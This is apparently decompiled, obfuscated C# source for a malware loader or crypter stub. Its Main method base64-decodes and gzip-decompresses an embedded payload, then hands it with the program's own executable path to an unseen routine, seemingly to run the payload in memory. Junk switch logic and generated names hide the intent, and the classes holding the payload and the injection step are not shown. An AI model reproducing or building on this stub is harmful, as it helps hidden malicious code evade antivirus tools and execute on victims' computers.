using System;
using System.IO;
using System.IO.Compression;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Class2
{
	[STAThread]
	public static void Main()
	{
		Class3.smethod_0();
		byte[] byte_ = smethod_0(Convert.FromBase64String(Class4.smethod_1()));
		GClass0.smethod_1(byte_, Application.get_ExecutablePath());
	}

	public static byte[] smethod_0(byte[] byte_0)
	{
		checked
		{
			using (MemoryStream memoryStream = new MemoryStream(byte_0))
			{
				int num = 4;
				GZipStream gZipStream = default(GZipStream);
				int num5 = default(int);
				for (int num2 = 0; num2 == 0; num2 = 1)
				{
					switch (num)
					{
					default:
						gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
						break;
					case 0:
					case 3:
						break;
					}
					try
					{
						int num3 = 0;
						int num4;
						do
						{
							byte_0 = (byte[])Utils.CopyArray((Array)byte_0, (Array)new byte[num3 + 1024 - 1 + 1]);
							num4 = gZipStream.Read(byte_0, num3, 1024);
							num3 += num4;
						}
						while (num4 >= 1024);
						byte_0 = (byte[])Utils.CopyArray((Array)byte_0, (Array)new byte[num3 - 1 + 1]);
						gZipStream.Close();
					}
					finally
					{
						((IDisposable)gZipStream)?.Dispose();
					}
					num5 = 4;
				}
				switch (num5)
				{
				default:
					memoryStream.Close();
					break;
				case 1:
				case 2:
				case 3:
					break;
				}
			}
			return byte_0;
		}
	}

	static Class2()
	{
		Class3.smethod_0();
	}
}
